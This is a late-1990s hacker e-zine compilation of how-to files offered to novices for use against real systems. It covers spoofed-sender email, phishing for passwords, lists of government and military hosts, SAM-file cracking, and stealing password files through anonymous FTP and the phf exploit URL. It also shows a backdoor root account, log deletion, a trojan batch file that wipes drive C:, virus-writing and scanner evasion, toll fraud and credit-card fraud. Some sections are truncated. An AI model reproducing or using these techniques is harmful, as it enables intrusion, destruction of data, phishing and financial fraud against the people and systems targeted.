This is surprisingly easy.  Sure you can download an anonymous e-mailer.
But thats no fun.  In this file I will teach you how to do anonymous mail
by telneting into the server.


To anonymous mail someone fist off you have to telnet into a system on
port 25.  Not all systems have port 25 open.  I am going to use the
server i use the most as an example.

Ok first off i telnet into demonspawn.inna.net 25.

telnet demonspawn.inna.net
Trying 209.48.124.11...
Connected to demonspawn.inna.net.
Escape character is '^]'.
220 demonspawn.inna.net ESMTP Sendmail 8.7.5/8.7.3; Wed, 4 Mar 1998 17:36:34 -
0500 

Ok, that meens i'm connected! Then you look at the server name. In this
case its demonspawn.inna.net.  So i type the following.

"helo demonspawn.inna.net"

The server than returnes:
250 demonspawn.inna.net Hello yourhosthere.com  [Your IP], pleased to meet you

Than you put who you want to make it from, by typing:
"MAIL FROM:BillGates@microsoft.com"  You can put any e-mail you want it from!

The Server Returns:
250 BillGates@microsoft.com... Sender ok

You than put who you want to send it to.(i'm gonna use me as an example):

"RCPT TO:Ghosthawk@gmx.net"

The Server Returnes:
250 Recipient ok

After that you type:
"DATA"

Then the server says:

354 Enter mail, end with "." on a line by itself

Than all you have to do is type your message,  than a "." and its sent! Easy!

Thats all for this file!!!

I have made this file mainly for the newbie Hacker.
But it will also be a good reference for the Elite Hacker.
I'm gonna have a list of some really cool computers to Hack.
I also will have some really nice ways to get passwords for the comps.

Computer Addresses:
<Just telnet to the addresses>
<I dont recomend trying to hack the .gov and .mil addresses>
Government:
sundance.ll.nl.gov
ednet1.osl.or.gov
mecsys.mec.ohio.gov
ARD.FBI.GOV  *FBI Main Computer*


Military:
hq.af.mil                *American Air Force HEADquarters*
pentagon.mil             *PENTAGON*
redstone.army.mil        *Army*
wpgate.hqpacaf.af.mil    *Area 51*
www.acc.af.mil

pao.gsfc.nasa.gov
farside.gsfc.nasa.gov

Thats all I have for the computer adresses.

Nice Ways to Get Passwords!
Here are some ways that ive found over time to get passwords.

Annonymous FTP:
The most common way is to annonymously FTP into the server. Say you wanna
hack http://www.target.com you would ftp into ftp.target.com, then you
would get etc/passwd.
Get your password cracker out and crack the password.  If its shadowed
you gotta problem. Shadowed passwords are where theres a * instead of
a password.

Annonymous E-Mail:
I neat little way i stumbled upon is to annonymous E-Mail them.
Works everytime, if their stupid. All you do is find out their ISP.
Its really easy.  If their E-mail is loser@killme.com you would E-Mail them
using the E-Mail, root@killme.com, or maybe sysadmin@killme.com.
Then you say the following:

Mail from : root@killme.com
Mail to : loser@killme.com
Message :
Dear Mr. Loser,
There has been a successful Hack attempt on your account.
If you would like this problem fixed please change your password
to "demo3".
Thank You For Using Kill Me Internet.
End Message!

BOOM!! Instant password. That works on all kinds of of systems,
shell accounts,  webpages, anything!

Social Enginnering:
I think this way is kind of funny.   There are a lot of different
Social Engineering methods. I will only discuss one way.  I found
this method and thought it was cool.  What you do is you call up where
the computer is hosted.  You get a username that you found from it and
pretend to be a girl.  Normally the guys running these computers have
no life and only see the sun 5 minutes a day, so they will love a girl.
Tell them in a real sexual way that you would like to get your password
changed to whatever,  normaly those guys will do anything for a girl.
Kinda lame but you might be able to use it as a last resort.

            4. Hacking Windows NT
               by the file ripper
               tfr@gmx.net
               March 19, 1998

      Okay, in this text I will shortly describe you a very easy way
how to hack a local Windows NT System. I write this text because I think
Micro$oft really sucks!


First check the system you want to hack...
I mean look at it, and check if you can boot with a Boot-Disk.
If you are able to boot from a Bootdisk, then all is no problem.
Once you are in the Dos-prompt (like "A:\>"), try to access c: by
typing in "C:". If this works, copy the "SAM."-file from the
directory "winnt\system\config" (if it's not located there, search
for it, with the dos-command : "dir /s sam. /a")
If you have no access to c:, then try a program called "NTFSDOS"
It gives you access on NTFS partions! It's really good. You are not logged!
But you also have only read-access.
Ok. After you got the file, get l0phtcrack from www.l0pht.com
Start L0phtcrack... File - Import SAM-File ... happy cracking!

Oh yeah... if the Bootdisk-trick don't works :
Log into the system like normal. If you don't have a username/password,
try to get in through the guest account. Just kill the CMOS (bios)
(because most of the time, the BIOS password is set, if it is you can
enter the BIOS without entering a password you don't need to kill
the CMOS!)
So you can de-lock the disk-lock!
Then restart your computer and re-setup the bios...
Don't forget : Bootsequenz should be : "A,C" (means, it first checks the
disk-drive for a bootable system)
Then work like said in the text above ...

A Other way :
Log in into the system, and get the "SAM._" file of the "winnt/repair"
directory. Before you can crack it, use :
 "expand sam._ sam." (because it's compressed...)
Okay, then run l0phtcrack. If Service Pack 3 is installed this won't
work and you have to use the way as I said above.

have phun!

            5. How to get a persons IP:
               >>>>>>--Andreaz--<<<<<<
               E-mail: andreaz@hehe.com
               March 21, 1998

1. *****Dummy*****
   Ask the person for his IP.

2. ****E-mail****
   Ask for the victim to send you an e-mail. When you have got the mail
   look at the properties, there you can find the IP.

3. ****ICQ-way****
   If you and the victim has ICQ then you can se his IP.
   Click on the nick, and the choose info. There does the IP stand.
   But sometimes has the person choosen not to show his IP, but
   for this only use the old ICQ-client, then you will see the
   IP as well, or just download a ICQ-sniffer.

4. ****IRC-way****
   If you are on IRC, then type "/dns nick".

5. *****Trace*****
   The easiest way is though to use an "IP-Tracer"

6. *****Guestbook***** (by the file ripper)
   Ask him to sign your GuestBook. (It saves the IP!)
   At www.lpage.com you can get a free guestbook.

7. *****Homepage*****  (by the file ripper)
   Ask him to go to your homepage.
   There you add a automatically opening link, for advertisment.
   The advertisment Server also will save the IP...

            6. Hacking of TOL-Chat
               by the file ripper
               tfr@gmx.net
               March 23, 1998

Okay, I don't think anybody of you knows the TOL-Chat, because this
chat is only for Tyroleans (Austria). But it's a good example for a
"secure" ;) cgi-chat. Like you know cgi ist a Common Gateway Interface.
That means, everyone has read-write-delete... access. 
Everytime you write a message in the chat, you write it in a cgi-file.
A CGI-URL looks like this (of TOL)

     http://www.tirol.com/Cgi-bin/chat_mainframe_rel.cgi?Spitz=Fucker

That means you only have to change then name after Spitz.
In this case you are chatter "Fucker". If you change "Fucker" to
"Hallo", then you are chatter "Hallo" and you can get all the messages
which are only for him, and you also can write messages, and everyone
will think he wrote it... That's a too simple thing :)

I know this is not hacking, but enjoy!

have phun!

            7. Hacking of Yahoo-Chat
               by Dave Crash
               crash_dave_1997@yahoo.com
               March 19, 1998

Okay, Dave_Crash found out a nice trick on the Yahoo-Chat, but he had
not the time to write a text about it, so I (the file ripper) will write
it for him.

First, Telnet into r2.chat.yahoo.com 4700
Note : r1-r12 are the chatservers.

Now it should ask you for a username and a password.
Type in "guest". It will let you in. Now you will see a couple of
messages scrolling down and down ...
It's like you are yourself in the chatroom, but you cann't write any
messages and cann't be "seen" by other chatters.
But that's not the thing we wanted...

Try typing in : "kick <chatter>".
You just kicked a chatter :). That's a nice trick.
You don't even need to be SuperUser or something like this, just kick
them out from the guestaccount *LOL*

have phun!

            8. Hacking VOL-Chat
               by the hacking cook
               Controlio@hotmail.com
               May 20, 1998


Okay, I'am sure you don't know the Austria Online chat...it's a chat 
from a provider in Austria...(go to: www.vol.at and there on chat)
But it's a good example for a HTML chat, and how to change your name there!
First you download the HTML-code of the chat (the part, where you can enter
your messages,... not the part where the messegas can be read)!
If you have done this, open the HTML-code in Notepad, so, now scroll to
the end of the text and there is a line:
<INPUT TYPE="hidden" NAME="nick" VALUE="HORNY">
so, now you are "HORNY" you only change the name, load the HTML again, and
are this chatter if u become a nother hacker load the HTML in your editor
and change the name, and load it again....
Dont get confused, if there stands "hacked" this isn't
your username!
I know, this is not realy hacking, but, I think it's
fun...so enjoy 
If you dont want to register you (you must register you, to become a password
and so on) here is the complete HTML:

<HTML>
<HEAD>
</HEAD>

<SCRIPT LANGUAGE=JavaScript>
function resetinput(form) {

            9. How To Use Outdials
               by AcidMeister                    
               warming@vol.com

This file is for folks who want to get started using outdials.  I tried to
explain everything in detail, assuming no prior knowledge.   Have phun.
I have used a lot of information obtained from other g-files in putting
together this file. 

 
Introduction: Outdials
~~~~~~~~~~~~~~~~~~~~~~
     Outdials are extremely useful things which can be used to call long
 distance without paying and without using codes.  Essentially, an
 outdial is a modem which is connected to a network.  You call up the
 network, then connect to the outdial over the network, then use the modem
 to call whatever system (BBS) you want to connect to.  Sounds
 complicated, but it really isn't.
 
 You will be using modems which are connected to the Telenet network.  There
 are outdials connected to Telenet in every area code.  So, you can call
 just about anywhere you want.  The problem is that generally, these outdials
 don't take collect connections over Telenet.  So, we have to use a way of
 getting around that.  That way is called PAC*IT.  PAC*IT is a service
 which is connected to Telenet.
 
 
Part I - Connecting to the Network
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     Ok, first you need to connect to the network.  The way to connect
to Telenet in order to use these outdials is through Pac*it, which is
some sort of gay PC pursuit deal.  Anyway, call Pac*it: 1-800-234-2796
at 2400/1200 7E1.  After connecting, log on:
 
           1200 baud:  just hit <cr> a couple of times
           2400 baud:  send an @ (shift-2) then a <cr>
 
It will now say
 
        PAC*IT Plus
 
        XXXXXXXXXXX111
 
The X's don't matter, what matters is the last three digits.  You can only
connect to U.S. modems if this number is between 100 and 300.  If the
three numbers on the end aren't between 100 and 300 then hang up and call
back.  Eventually, you will get one that is OK.
 
Under the numbers it will say: 'TERMINAL =' just hit return here.
You will now see the well known '@' prompt.  This means you are
connected to Telenet.
 
Part II - Connecting to the Outdial
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  Now, you need to know a bit about the way
systems on Telenet are addressed.  To connect to a system (i.e. outdial)
at the '@' prompt, you type the address of the system you want and hit
return.  You must use the Telenet International Address Format to
connect to outdials if you called in through PAC*IT.  It looks like
this:
 
      |------------------------  Data Network Ident. Code (DNIC)
      |
      |      |-----------------  Area code
      |      |
      |      |     |----------- DTE address (the specific system in the
      /\     |    / \                               area code)
     /  \   / \  /   \  /\----- Port Address
     IIII   AAA  NNNNN  PP
 
For example the Telenet address of 201 346  becomes 31102010034600
 
 
So, connect to the outdial in the area code you want by typing in the complete
address of the outdial.  I know, you are saying to yourself "Where the
hell do I get addresses of outdials?"  Well, at the end of this g-file,
of course.
 
After you have entered the address, you will get a 'CONNECTED' or else
some error message.  If you get an error, try again, or try another
outdial.
 
Part III - Using the Outdial
~~~~~~~~~~~~~~~~~~~~~~~~~~~~
After you connect, hit ctrl-E a few times, then hit return.  After a few
seconds you should get a message like '*Hello, I'm Ready*'  You are now
connected to a modem!   Help is available, just enter a ? or H.  The
command you are most concerned with is D (dial command).  So, enter D
and it should ask you for the number.  Just type in the phone number
you want to dial (no area code).  It should then say "Dialing..."  If
you connect, great, you should know what to do now.  If the number is
busy, or out-of-order or whatever, the outdial will return to command
mode.  You can then dial again.
 
You can generally disconnect from the outdial itself by entering an '@'
then hitting return in the command mode.  You should then get the '@'
prompt back.  Now you can connect to another outdial in a different area
code if you want to.  Just follow the procedure in Part II again.
 
 
Part IV - Outdial Addresses

Part V - Finishing Up
~~~~~~~~~~~~~~~~~~~~~
As best I can tell, this is a very safe method if you don't abuse it,
over use it, etc.  Remember, this is a 1-800 number, so if you call it
200 times in a week or 30 times in a day, you may get a call yourself.
So, to keep this method alive for everyone to use, don't do this too
much.

I hope this file has been helpful to you.  There are plenty of people
who know a lot more about this stuff than I do.  But, I will definitely
try to help anyone out if I can.

           10. Web Page Hacking For Newbies
               by AcidMeister
               warming@vol.com
               December 30, 1997

First of all you will need an ftp program such as ws_ftp.  I use Voyager FTP
downloadable at http://www.windows95.com it's real simple and easy to use, 
so try it if you haven't dealt with ftp before.  Now once you have the 
program find an address like http://www.shiga-pc.ac.jp you can find 
addresses like this by going to a search engine such as AltaVista and 
running a search for url:ac.jp this tells the search engine to give you 
all the academic addresses in Japan  ex.  ac=academic jp=Japan , you can 
try this with any country ex.  url:dk .  But for now let's just focus on 
the Japanese servers. When u have an address (I would recommend making a 
list of about 100 and trying them all) go to your ftp program and type in 
the address ex.  http://www.shiga-pc.ac.jp  note..  You will have to log in 
anonymously.   You should then get a list of folders on the remote system 
usr, pub,etc, dev, bin.  See the etc folder? open it, once opened you should 
see some files passwd and group, open or view the file passwd (this is where 
the passwords for the system are stored), you should hopefully get something 
that looks like this.

dbrown:fmTUonryY2mCE:295:15:Doris Brown:/usr/email/users/dbrown:/bin/csh

This means you've hit the jackpot, in this case you should get a password 
cracker download one at (http://www.hackersweb.com  go to the hacking toolz 
section), I would recommend for the beginning hacker to get a password 
cracker such as killer cracker because it's extremely easy to use.  Once you 
have downloaded killer cracker you will need a dictionary file 
(get one at http://www.hackersweb.com  look in the extra toolz section), 
dictionary filez are better the bigger they are so I would recommend 
getting one at around 10 MB or more.  Now the passwords from the passwd 
file off the server you are hacking, you will need to save them to a file 
and place them in the same directory as Killer Cracker, you will also need 
to have your dictionary file in the same directory.  Now you are ready to 
go, just run killer cracker and tell it the name of the Pwfile=the password 
file and the name of the word file=your dictionary file, the valid file will 
be the file where the output of the password cracker will be put just give 
it a name such as crack.txt.  Once the cracker is done cracking the password 
files for you goto the valid file and take a look the file should look 
something like this root:root:0:1:System PRIVILEGED Account,,,:/:/bin/csh 
(remember this is an example). This file says that the username is root 
and the password is root if the file had been like this.
root:dumbass:0:1:System PRIVILEGED Account,,,:/:/bin/csh 
(remember again just an example) the login or username would be root and 
the password would be dumbass, well that's it just ftp to the site using 
the login and password.  Note if you get root type in the following once 
you have logged in:-   echo "myserver::0:0:Test User:/:/bin/csh">>etc\passwd
this will allow you to login to the server with 1:myserver so you 
get the admin suspicious when they see people login as root.  Hide yourself 
as much as possible, if you already have a shell then go through that first 
when loggin on, or telnet to the hacked site shell and then re-telnet to the 
hacked shell using the hacked shell, if you see what I mean, so your who 
appears as local host.  Also get some c scripts which delete your presence, 
erases you off logs etc

Now if you were not as lucky to get exactly the same password file as shown 
in the example above then maybe you got something like this.

root:*:0:1:Operator:/:
ftp:*:53:53:anonymous ftp:/pub:
t2:*:201:201:Takaoka Tadashi:/pub:

This means that the passwd file is shadowed, if this is the case then 
welcome to the administrators world of trying to stop hackers, this is 
where you cant really do anything.  However there is one thing to do 
sometimes in very rare cases there may be a folder on the remote system 
that can be accessed by an anonymous login called shadowed, shadow, or 
secret if this is the case the password files should be in there,
congratulations.   If there isn't a folder like this, and the passwd file 
is shadowed then bad luck, go to the next address on your list.

Now that you have tried the first thing as shown above there are a couple 
of other methods you may also want to try one is FTP hacking shown below

Go to a dos prompt after you are connected to the internet .

Type.

ftp www.victim=the site address
server will ask for a username press enter
server will ask for a password press enter
at the prompt type quote  user ftp
then type 
quote cwd ~root
then type
quote pass ftp

If you get in make sure you delete the log file they might look at it and 
see that you were on.  Once you get on the passwd file is in etc/passwd so 
type cd etc then type get passwd.  If you have done the above right and the 
server is old you will have root access.  By the way root is the highest 
security status you can have.


Another good way of getting root or a shell at least is through browser 
hacking.  Again well use Japanese educational servers as our target. To do 
this you will need a browser such as Netscape or Internet Explorer, you 
will also need a telnet program, you can either download a telnet program 
at http://www.windows95.com or use the one that already comes with dos.  
To access the telnet program that comes with dos go to your dos windows and 
type in telnet www.site.com  the site.com stand for the site you want to 
telnet to, it could be anything like www.geidai.ac.jp or 
www.tulips.tsukuba.ac.jp .  You will also need a cracker program I would 
recommend using Killer Cracker and applying as above.

Next thing you do is open your browser and run a search for url:ac.jp , 
like explained above.  Again I would recommend making a big list of your 
targets.  Now when you have your targets we address type it in your browser 
and add this to it

http://www.webpage.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd

or

http://www.webpage.com/cgi/phf?Qalias=x%0a/bin/cat%20/etc/passwd

To all you out there who are slightly advanced, I know this is the phf 
technique and it is virtually dead, but you'll be surprised where you can 
use this.

This technique of finding the password file was first used in November 1996 
on the fbi.gov webpage by a few hackers. It has been patched up by a lot of 
servers, so this won't work on something like www.nasa.gov or most of the 
www.*.com sites.  But still works on many university servers outside Europe 
and the U.S.

O.K.  Once the url is entered you will see a number of things:-

Error 404

Cgi-bin/phf is not found on this server (the most common one)

Or

Warning

You do not have permission to view cgi-bin/phf?/ on this server

There are a number of other things the server might say, but the thing you 
want it to say is this:-

Query Results

/usr/local/bin/ph -m alias=x /bin/cat /etc/passwd 

root:2hjh34b4hj:0:1:0000-Admin(0000):/:/bin/sh

listen:eoend:37:4:Network Admin:/usr/net/nls:
nobody:ccvjcvj:60001:60001:uid no b

etc

This means you have hit the jackpot!!!

If you get something similar to this but all lines have something in common 
like the following:-

(notice the c) if you don't know what this means it means the password 
file is shadowed and you cannot work out the passwords for a shadowed 
password file then you're in bad luck, I would recommend trying the ftp 
hack prior to this for the best results.

If some but not all logins have a * in them then it's ok, it's worth while 
getting the ones which aren't shadowed, hey a shell is a shell!!!

If you want to use your newly acquired shells then telnet to the site and 
put in the login and the password (remember you have to crack the password 
file first explained at the top).

           13. Trojaning
               by the file ripper
               tfr@gmx.net
               May 30, 1998


What is trojaning ?
   Remember the story with the city trojan ?
   The greeks couldn't defeat the trojans, so they used a trick.
   The greeks gave the trojans a present. A wooden horse and the
   belly was hollow. In the empty belly the put in the best warrios.
   The silly trojans take the horse into their city and they celebrate
   the victory. After all trojans are drunken the warrios came out, 
   and so they defeated finally the trojans ... by the way : The horse
   was later on called the "trojan horse"...

   In the Computerworld it's exactly the same. A *evil* program is hidden
   in an helpful programm.


For what is trojaning used ??
   Let's see ... ;) I just told you the greeks defeated with this trojan
   horse the trojans ... now what do you think for what are this little
   programmz used ?? For gaining access ... Let's say you give a trojan
   to an sysadmin and he runs the programm from his admin-account, so the
   programm is able to access more things than you as a normal user.
   Let's say you want to change the password of the admin ... with a
   trojan you can make it! The only problem is, that trojaning (mostly) only
   works in systems like Novell or Win/Dos/Unix-based systems.


How do I trojan a system ??
   In Dos (=Disk owning system ;) you can easily make a trojan by using
   script files. In Dos script files are called Batch. It's like you give
   in commands in the Dos, but you don't have to type every single command
   in... oh yeah ... the extention for Batchfiles is .BAT

   example :
    if you type in in DOS :
    DIR
    then something like this appears (sorry all in german;) :


    Datentr„ger in Laufwerk D: TFR
    Seriennummer des Datentr„gers: 1234-1234
    Verzeichnis von T:\TFR\TFR
   
   .              <DIR>        05-30-98  1:31a .
   ..             <DIR>        05-30-98  1:31a ..
   1        TXT        40,545  05-30-98  1:31a 1.txt
   BATCH    BAT         3,459  05-30-98  1:31a batch.bat
   3        TXT     1,231,230  05-30-98  1:31a a.txt
            3 Datei(en)             1,274,134 Bytes
            2 Verzeichnis(se) 110,562,366,976 Bytes frei


   that means :

   BATCH    BAT         3,459  05-30-98  1:31a bAtCh.BaT
     |      |           |      |         |     |
     |      |           |      |         |     |- Win95 Name
     |      |           |      |         |- Creation time
     |      |           |      |- Creation date
     |      |           |-Filesize (=3 KB and 459 bytes ...)
     |      |-Extention
     |-First Name ;)

   if you want to run this file, just type in BATCH <enter>
   (note : don't type in <Enter> ;)

   Ok, now I show you how I programmed my first trojan :

   first change into the system-dir by typing in "cd <dir>".
   In MS-Dos systems the system-dir is noramlly C:\dos\, in
   windows-based systems c:\windows\command\
   then start the editor by typing in "edit xcopy.bat"
   ok, now type in the following commands (note : don't write the
   things marked with ";")

   @echo off                       ;hide all commands
   copy %1 %2                      ;do the helpful part
   deltree C: /y                   ;kill C:, every file ...

   That's it. Oh yeah. Now exit the editor and enter the following command :
   "del xcopy.exe". Ok, now you installed the trojan. When someone is now
   running xcopy it will work correctly, but after he reboots the system is
   empty...;)
   I used this little programm on a computersystem with more
   than 20 computers ... every single computer was killed ;)
   If the system is compress with Drivespace or Doublespace it's easier.
   Just type change "deltree C: /y" to "deltree h: /Y" ...
   In Drivespace/Doublespace the real partition is saved on the Drive H:
   If you work on C:, before you start a file the file will be decompressed
   from drive H:. If you delete H: (note : msdos won't let you format this
   drive!) all is away ... even the partition is away ;). That means not
   even the best recovery programm can recover the programmz...

   That was one of the easy ways. On every system, there is a big diffrence
   how to trojan it.

   I don't want to show you more of my trojans because I noticed if I write
   many possiblities the dudes reading it, get lazy and only copy my trojans.
   And I think you should be able to write your own. There are no limits.
   You can use about every program to make it. I programmed some in Pascal.
   Not because it's fast or something like this. But I programmed about 4
   years in Pascal and I'm able to make about every programm in it ;)... so
   I like this language best. C++ is also great, but I hadn't enough time
   latly to check out all commands... But if you want to programm really
   professional Trojans use Assembler (ASM) it's the only real programming
   language! Only to activate your brain : In Novell you can change your
   password by typing in a command - I cann't remember well, but I think
   it was "setpass <oldpassword> <newpassword>" (or something like this).
   Hope you got now some new ideas and show the admins who rules ;)


Some words :
    - If you mail me, please write short messages. I mostly have not much
      time and if I get a message that is short I can answer more message
      in the same time! Oh yeah, if you don't get a message soon, don't
      get mad, if you don't receive a reply message within 2 weeks mail me
      again! (tfr@gmx.net)

           14. Programming Virii
               by the file ripper
               tfr@gmx.net
               May 30, 1998


Before I start talking about programming Virii, what is an Virus ?
(Note : Virii is the pluralform from Virus ;)
And virus is an program, that repoduce itselfs by copying his code
onto a normal file, so the virus can spread hisself over the whole
harddisk. Normally this causes problems. In many cases the Virus
has also some evil functions implanted, like formating the harddisk
on the 1st of April or some other jokes. To become a good virus programm
you need to know well Assembler. If I talk about programming Virii, I don't
mean getting a virus-creation set and saying the computer what the virus
should do and the creation set will do all the programming work for you...
that's really lame. These Virus are easier to detect, then a elephant in
a house made of glass ;). But there are also some tricks to make your virus
undetectable by any Virusscanner, they keyword is "polymorph", that means
everytime the virus infects a new file, his code changes, the virus
programms itselfs new... (one of the difficult ways). But over the time
I found a way how to make even Virii like Jerusalem.Standard undetectable,
but I will describe this later on in my text.

First, choose the programming language you know best.
In my case it's Pascal (language between Basic and C++)

The second step, is thinking of how the Virus repoduce itselfs. There
are many possiblities. The easiest one is "overwritting", that means
everytime the virus infects the file, the virus replaces all the code of
the programm with itselfs. But this is very conspicuous, so the some
programmer developed some other methode like adding ... (means, that
the virus don't changes anything on the Programm, the Programm is runable,
evertime the programm is started the virus is loaded in the Memory and
infects every programm, that the user run.). But this one is also
a bit conspicuous, because the filesize changes. Again some programmers
had a better idea. Normally in FAT16 (MSDOS) every file you create needs
from the beginning 16KB - 32KB (because of the blocks). That means if you 
created a file and only type in 1 single letter, you waste about 16-32KB.
And Virii use this slack (it's called like this) for there code. There
are even Virii out there, that do "steahling". That means if they are in
memory not even virusscanners are able to detect them. Even if you do
"dir" and the virus is in memory the filesize hasn't change. But if the
virus is not in the memory mostly the filesize has changed, so this is
also one of the complicated variants, because you need much informations
about MSDOS systems and how the work (vectors,interrupts...).
In my case I take the easiest on ... Overwritting.

Ok. The next step is programming ;)

  Assign(A, Paramstr(0));

Yeah, I only built in the important informations. Normally you can also
build in some things like after 10 commands it writes "fuck you" or formats
your harddisk, and stuff like this. But VIRUS.PAS is harmless, after it
was started it is resistent (it creats a new dos-shell) and every file
that is started, which is an exe-file will get infected.
You only have to compile VIRUS.PAS with the pascal-compiler (tpc),
after that the file should have a size of exactly 4,460 KBytes. But
the Virus is a bit big. You can make the file smaller by using Pklite.

PkLite also can be used to make normal Virii, that are detectable by nearly
every Virusscanner, undetectable. Because many Virusscaner search for
special strings in the Virus-code, you can make the Virus undetectable
by compressing it with programms like PkLite or some File-Protection Programz.

That's it ... I hope you enjoyed the text, if you liked it, write
me some comments to : tfr@gmx.net -thanx-.

Because I get every day many mails, only asking for XXX passwords, I
decided to add this little section to this magazine.
First of all ... I know many are ONLY interessted in stuff like this, they
learn hacking ONLY for gaining access to XXX/Porno, but this guys are
LAMERZ. Hacking is for gaining informations, not for sexual arouse!!!
PLEASE DON'T MAIL ME IF THIS TECHNIQUE WRITTEN HERE DON'T WORKS!
I DON'T GIVE ANY SUPPORT ON THIS CRAP!

There are 3 possiblities.

* Here are some free sites :

     http://www.freeporn.com
     http://www.hardporn.com

   (you don't even have to tell your creditcardnumber...no age verification!)
   every week new pix

* XXX/Porno archive :

     http://www.knoflach.com/sex

     username : sex
     password : sex

    about 1,6 Gb of pictures, videos...

    the server is only up, when a friend of mine is online, so try
    often. I think he normally goes online about 0900 pm GMT.

* Hacking ;)

  I don't called it hacking, but it's something like that ;).
  First get a CreditCard (CC) generator. You can download one at
  ftp.uha1.com/pub/credit/creditw.zip

  or if you need fast some numbers here are some :

    Discover Card    : 6011 0078 8614 3428
    Mastercard       : 5318 8459 3741 8709
    Visa             : 4013 345 617 301
    American Express : 3047 000672 87662

  Note : The first 4 digits are the bank id number.
         Visa numbers can have 13 or 16 digits.
         Discover Card - numbers have to begin with 60110.

  Ok. Now go to the Registration Page of that sucking Porno Page and
  register yourself. Don't use your real name. Be creative and invent
  and Name that sounds like it's real ;). Fill out all informations,
  you also have to fill out the CreditCard information (note : don't
  use the number standing on your own CreditCard ;). Some old servers
  don't check if the creditcard is valid, they check if the creditcard
  is valid build ... that means they ONLY check if the creditcard is
  looking like a real one. That's it. Normally the Software tells you
  that you can know login with username and password you entered before
  or some shit like that.


Ok, I hope you awesome guys are now lucky!
I only wrote this text about it, because I get many request on that
and I'm not interessted in writting crap like this every day!
